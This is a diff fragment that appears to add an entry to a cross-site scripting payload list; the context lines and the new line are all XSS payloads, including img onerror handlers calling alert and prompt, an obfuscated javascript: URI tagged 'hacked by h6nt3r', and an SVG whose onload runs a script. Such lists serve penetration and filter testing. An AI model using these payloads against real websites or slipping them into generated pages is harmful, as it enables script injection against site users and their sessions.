@@ -166,3 +166,4 @@ Testing%22+data-toggle%3Dcollapse+data-target%3D%3Cimg%26%23x20%3Bsrc%3Dx%26%23x
 1'"><img/src/onerror​=.1|alert``>
 "><img src=x onerror=prompt(1);>
 javascript​:const originx="hacked by h6nt3r",var{a:onerror}={a:%2561lert};throw originx
+/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" onload​="alert('XSS via SVG!')"><circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" /></svg>
